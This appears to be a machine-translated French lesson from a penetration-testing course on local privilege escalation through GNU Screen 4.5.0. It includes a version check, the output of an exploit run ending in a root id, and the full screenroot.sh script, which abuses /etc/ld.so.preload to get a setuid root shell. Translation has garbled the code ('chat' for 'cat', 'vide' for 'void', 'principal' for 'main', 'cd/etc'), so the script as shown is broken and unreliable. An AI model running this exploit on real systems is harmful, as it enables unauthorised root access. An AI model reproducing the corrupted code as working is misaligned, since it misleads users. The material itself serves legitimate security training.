Services vulnérables
===================

* * * * *

De nombreux services peuvent être trouvés, qui présentent des failles qui peuvent être exploitées pour élever les privilèges. Un exemple est le populaire multiplexeur de terminaux [Screen](https://linux.die.net/man/1/screen). La version 4.5.0 souffre d'une vulnérabilité d'escalade de privilèges en raison d'un manque de vérification des autorisations lors de l'ouverture d'un fichier journal.

#### Identification de la version de l'écran

Identification de la version d'écran

```
dsgsec@htb[/htb]$ screen -v

Version d'écran 4.05.00 (GNU) 10-Dec-16

```

Cela permet à un attaquant de tronquer n'importe quel fichier ou de créer un fichier appartenant à root dans n'importe quel répertoire et d'obtenir finalement un accès root complet.

#### Escalade des privilèges - Screen_Exploit.sh

Escalade des privilèges - Screen_Exploit.sh

```
dsgsec@htb[/htb]$ ./screen_exploit.sh

~ gnu/racine d'écran ~
[+] Tout d'abord, nous créons notre shell et notre bibliothèque...
[+] Nous créons maintenant notre fichier /etc/ld.so.preload...
[+] Déclenchement...
' de /etc/ld.so.preload ne peut pas être préchargé (impossible d'ouvrir le fichier objet partagé) : ignoré.
[+] terminé !
Aucun socket trouvé dans /run/screen/S-mrb3n.

# identifiant
uid=0(racine) gid=0(racine) groupes=0(racine),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115 (lpadmin),116(sambashare),1000(mrb3n)

```

Le script ci-dessous peut être utilisé pour effectuer cette attaque par élévation de privilèges :

#### Screen_Exploit_POC.sh

Code : bash

```
#!/bin/bash
# screenroot.sh
# écran setuid v4.5.0 exploitation racine locale
# abuse de l'écrasement de ld.so.preload pour obtenir root.
# bogue : https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACKER LA PLANÈTE
# ~ infodox (25/01/2017)
echo "~ gnu/racine d'écran ~"
echo "[+] Tout d'abord, nous créons notre shell et notre bibliothèque..."
chat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribut__ ((__constructeur__))
vide dropshell (vide) {
     chown("/tmp/rootshell", 0, 0);
     chmod("/tmp/rootshell", 04755);
     unlink("/etc/ld.so.preload");
     printf("[+] fait !\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
chat << EOF > /tmp/rootshell.c
#include <stdio.h>
int principal(vide){
     setuid(0);
     setgid(0);
     setuid(0);
     setegid(0);
     execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Nous créons maintenant notre fichier /etc/ld.so.preload..."
cd/etc
umask 000 # parce que
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # nouvelle ligne nécessaire
echo "[+] Déclenchement..."
screen -ls # l'écran lui-même est setuid, donc...
/tmp/rootshell

```